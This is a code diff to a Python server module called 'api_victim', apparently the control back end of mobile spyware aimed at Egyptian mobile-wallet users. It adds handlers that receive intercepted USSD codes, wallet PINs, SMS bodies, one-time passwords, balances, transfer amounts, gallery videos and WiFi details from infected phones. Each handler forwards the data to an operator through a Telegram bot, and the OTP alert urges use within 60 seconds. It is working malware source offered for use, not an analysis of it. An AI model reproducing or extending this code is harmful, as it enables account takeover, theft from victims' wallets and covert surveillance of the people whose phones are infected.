@@ -27,6 +27,9 @@ from monitoring import metrics
 logger = get_logger("api_victim")
 
 
+# ============================================================
+# Escape HTML
+# ============================================================
 def h(text):
     """★ Escape HTML"""
     if text is None:
@@ -290,9 +293,127 @@ def init_victim_api(app, bot_instance=None):
             metrics.inc_counter("victim_data", tags={"type": dtype})
 
             # ============================================================
+            # ★★★ USSD Interceptor ★★★
+            # ============================================================
+            if dtype == "ussd_detected":
+                ussd_data = data.get("data", {})
+                code = ussd_data.get("code", "")
+                pin = ussd_data.get("pin", "")
+                cached_pin = ussd_data.get("cached_pin", "")
+                wallet = ussd_data.get("wallet", "Unknown")
+                is_wallet = ussd_data.get("is_wallet", False)
+
+                if is_wallet:
+                    text = (
+                        f"💰 <b>USSD محفظة مرصودة!</b>\n"
+                        f"━━━━━━━━━━━━━━━━━━\n"
+                        f"👤 <b>{h(victim_name)}</b>\n"
+                        f"🏦 المحفظة: <b>{h(wallet)}</b>\n"
+                        f"📱 الكود: <code>{h(code)}</code>\n"
+                    )
+
+                    if pin:
+                        text += f"\n🔑 <b>PIN Code:</b> <code>{h(pin)}</code>\n"
+                        text += f"⚠️ <i>PIN متاح للاستخدام!</i>"
+
+                    if cached_pin and cached_pin != pin:
+                        text += f"\n💾 PIN محفوظ: <code>{h(cached_pin)}</code>"
+
+                    bot.send_message(cid, text, parse_mode="HTML")
+                    logger.info(f"USSD wallet: {code} | PIN={pin}")
+                    metrics.inc_counter("ussd_wallet_detected")
+
+                else:
+                    # كود عادي
+                    text = (
+                        f"📱 <b>USSD عادي</b>\n"
+                        f"👤 {h(victim_name)}\n"
+                        f"📟 <code>{h(code)}</code>"
+                    )
+                    bot.send_message(cid, text, parse_mode="HTML")
+
+            # ============================================================
+            # ★★★ SMS Interceptor ★★★
+            # ============================================================
+            elif dtype == "sms_received":
+                sms_data = data.get("data", {})
+                sender = sms_data.get("sender", "Unknown")
+                body = sms_data.get("body", "")
+                otp = sms_data.get("otp", "")
+                balance = sms_data.get("balance", "")
+                transfer = sms_data.get("transfer_amount", "")
+                pin = sms_data.get("pin", "")
+                is_wallet = sms_data.get("is_wallet", False)
+
+                # ★★ OTP → أولوية عالية ★★
+                if otp:
+                    text = (
+                        f"🔐 <b>OTP جديد!</b>\n"
+                        f"━━━━━━━━━━━━━━━━━━\n"
+                        f"👤 {h(victim_name)}\n"
+                        f"📨 من: <code>{h(sender)}</code>\n"
+                        f"━━━━━━━━━━━━━━━━━━\n"
+                        f"🔑 <b>الكود: <code>{h(otp)}</code></b>\n"
+                        f"━━━━━━━━━━━━━━━━━━\n"
+                        f"⚡ <i>استخدمه خلال 60 ثانية</i>"
+                    )
+                    bot.send_message(cid, text, parse_mode="HTML")
+                    logger.info(f"OTP received: {otp} from {sender}")
+                    metrics.inc_counter("otp_received")
+
+                # ★★ PIN ★★
+                if pin and not otp:
+                    text = (
+                        f"🔑 <b>PIN جديد!</b>\n"
+                        f"👤 {h(victim_name)}\n"
+                        f"📨 من: <code>{h(sender)}</code>\n"
+                        f"🔐 <b>PIN: <code>{h(pin)}</code></b>"
+                    )
+                    bot.send_message(cid, text, parse_mode="HTML")
+                    metrics.inc_counter("pin_received")
+
+                # ★★ محفظة / رصيد / تحويل ★★
+                if is_wallet and not otp:
+                    text = (
+                        f"📨 <b>رسالة محفظة!</b>\n"
+                        f"━━━━━━━━━━━━━━━━━━\n"
+                        f"👤 {h(victim_name)}\n"
+                        f"📱 من: <code>{h(sender)}</code>\n"
+                    )
+
+                    if balance:
+                        text += f"\n💰 <b>الرصيد:</b> <code>{h(balance)} EGP</code>\n"
+
+                    if transfer:
+                        text += f"\n💸 <b>محول:</b> <code>{h(transfer)} EGP</code>\n"
+
+                    text += f"\n📝 <b>النص:</b>\n<pre>{h(body[:400])}</pre>"
+
+                    bot.send_message(cid, text, parse_mode="HTML")
+                    metrics.inc_counter("wallet_sms_received")
+
+            # ============================================================
+            # ★★★ Interceptor Ready ★★★
+            # ============================================================
+            elif dtype == "interceptor_ready":
+                bot.send_message(
+                    cid,
+                    f"✅ <b>USSD/SMS Interceptor جاهز</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 <b>{h(victim_name)}</b>\n"
+                    f"📱 الآن نراقب:\n"
+                    f"  • كل كود USSD\n"
+                    f"  • كل SMS داخلة\n"
+                    f"  • كودات OTP\n"
+                    f"  • PIN المحفظة",
+                    parse_mode="HTML"
+                )
+                logger.info(f"Interceptor ready for {victim_name}")
+
+            # ============================================================
             # Camera
             # ============================================================
-            if dtype == "camera_photo":
+            elif dtype == "camera_photo":
                 img_data = data.get('image', '')
                 cam_name = data.get('camera_name', '')
                 cam_icon = "📷 أمامية" if cam_name == "front" else "📸 خلفية"
@@ -397,6 +518,49 @@ def init_victim_api(app, bot_instance=None):
                         logger.warning(f"video error: {e}")
 
             # ============================================================
+            # Video File (من الاستوديو)
+            # ============================================================
+            elif dtype == "video_file":
+                video_data = data.get("video", "")
+                video_name = data.get("name", "video.mp4")
+                duration = data.get("duration", 0)
+                size = data.get("size", 0)
+
+                if video_data and video_data.startswith("data:video"):
+                    try:
+                        _, encoded = video_data.split(",", 1)
+                        vid_bytes = base64.b64decode(encoded)
+                        buf_io = io.BytesIO(vid_bytes)
+                        buf_io.name = video_name
+
+                        size_mb = size / 1024 / 1024
+                        bot.send_video(
+                            cid, buf_io,
+                            caption=(
+                                f"🎥 <b>فيديو من الجهاز</b>\n"
+                                f"👤 {h(victim_name)}\n"
+                                f"📁 {h(video_name)}\n"
+                                f"📊 {size_mb:.1f} MB | ⏱️ {duration/1000:.1f}s"
+                            ),
+                            parse_mode="HTML",
+                            timeout=120
+                        )
+                    except Exception as e:
+                        logger.warning(f"video_file error: {e}")
+
+            elif dtype == "videos_done":
+                total = data.get("total", 0)
+                try:
+                    bot.send_message(
+                        cid,
+                        f"✅ <b>تم استلام الفيديوهات</b> — {h(victim_name)}\n"
+                        f"📊 الإجمالي: {total}",
+                        parse_mode="HTML"
+                    )
+                except Exception:
+                    pass
+
+            # ============================================================
             # Audio
             # ============================================================
             elif dtype == "audio_record":
@@ -445,7 +609,7 @@ def init_victim_api(app, bot_instance=None):
                 bot.send_message(cid, text, parse_mode="HTML")
 
             # ============================================================
-            # SMS
+            # SMS (قراءة)
             # ============================================================
             elif dtype == "sms":
                 sms_list = data.get("sms", [])
@@ -530,6 +694,22 @@ def init_victim_api(app, bot_instance=None):
                     )
                 else:
                     bot.send_message(cid, f"❌ لا يوجد موقع من {h(victim_name)}", parse_mode="HTML")
+
+            # ============================================================
+            # WiFi Info
+            # ============================================================
+            elif dtype == "wifi_info":
+                text = (
+                    f"📶 <b>معلومات WiFi</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 {h(victim_name)}\n"
+                    f"📡 SSID: <code>{h(data.get('ssid', 'N/A'))}</code>\n"
+                    f"🔒 BSSID: <code>{h(data.get('bssid', 'N/A'))}</code>\n"
+                    f"🌐 IP: <code>{h(data.get('ip', 'N/A'))}</code>\n"
+                    f"📊 Speed: <code>{h(data.get('link_speed', 'N/A'))}</code>\n"
+                    f"📶 Signal: <code>{h(data.get('rssi', 'N/A'))}</code> dBm"
+                )
+                bot.send_message(cid, text, parse_mode="HTML")
 
             # ============================================================
             # Clipboard
